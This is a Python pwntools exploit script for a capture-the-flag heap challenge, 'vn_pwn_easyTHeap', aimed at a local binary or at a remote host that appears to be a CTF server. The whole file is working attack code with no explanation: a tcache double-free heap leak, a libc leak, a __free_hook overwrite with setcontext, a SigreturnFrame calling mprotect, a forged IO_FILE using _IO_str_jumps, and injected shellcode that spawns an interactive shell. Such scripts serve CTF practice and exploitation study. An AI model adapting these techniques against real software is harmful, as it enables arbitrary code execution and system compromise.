#coding:utf-8
import sys
from pwn import *
from FILE import *
context.log_level='debug'
context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./vn_pwn_easyTHeap')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./vn_pwn_easyTHeap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27566)
			elf=ELF('./vn_pwn_easyTHeap')
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]

		def add(a):
			io.sendlineafter('choice: ','1')
			io.sendlineafter('size?',str(a))

		def edit(a,b):
			io.sendlineafter('choice: ','2')
			io.sendlineafter('idx?',str(a))
			io.sendafter('content:',b)

		def show(a):
			io.sendlineafter('choice: ','3')
			io.sendlineafter('idx?',str(a))

		def delete(a):
			io.sendlineafter('choice: ','4')
			io.sendlineafter('idx?',str(a))


		add(0x100)

		delete(0)
		delete(0)
		show(0)
		heap_base=u64(io.recv(6)+'\x00\x00')-0x260

		add(0x100)
		shell1='''
		xor rdi,rdi
		mov rsi,%d
		mov rdx,0x1000
		xor rax,rax

		syscall
		jmp rsi
		'''%heap_base

		edit(1,p64(heap_base+0x10)+p64(0)+p64(heap_base+0x278)+asm(shell1))
		add(0x100)
		add(0x100)
		edit(3,'\x00'*15+'\x07'+'\x00'*0xb8)
		add(0x100)
		delete(0)
		show(0)
		libc_base=u64(io.recv(6)+'\x00\x00')-0x10-96-libc.sym['__malloc_hook']
		libc.address=libc_base
		edit(3,'\x00'*0xb0+p64(libc.sym['__free_hook'])+p64(libc.sym['_IO_2_1_stdin_']))
		add(0x100)
		add(0xf0)
		edit(6,p64(libc.sym['setcontext']+53))
		srop_mprotect=SigreturnFrame()
		srop_mprotect.rsp=heap_base+0x270
		srop_mprotect.rdi=heap_base
		srop_mprotect.rsi=0x1000
		srop_mprotect.rdx=4|2|1
		srop_mprotect.rip=libc.sym['mprotect']
		print hex(len(str(srop_mprotect)))
		edit(4,str(srop_mprotect))


		_IO_str_jumps=libc_base+0x3E8360#0x1B4360  0x3E8360
		_IO_list_all=libc.sym['_IO_list_all']
		from FILE import *
		context.arch='amd64'
		fake_file=IO_FILE_plus_struct()
		fake_file._flags = 0
		fake_file._IO_buf_base = heap_base+0x370
		fake_file._IO_write_base = 0
		fake_file._IO_write_ptr = 1
		fake_file._IO_read_ptr = 0x61
		fake_file._IO_read_base =_IO_list_all-0x10
		fake_file._mode =0
		fake_file.vtable = _IO_str_jumps-8
		pay=str(fake_file).ljust(0xe8,'\x00')+p64(libc.sym['free'])
		# gdb.attach(io)
		# pause()
		edit(5,pay)
		shell2=shellcraft.sh()
		io.sendline('5')

		io.sendline(asm(shell2))

		success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()



	
	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue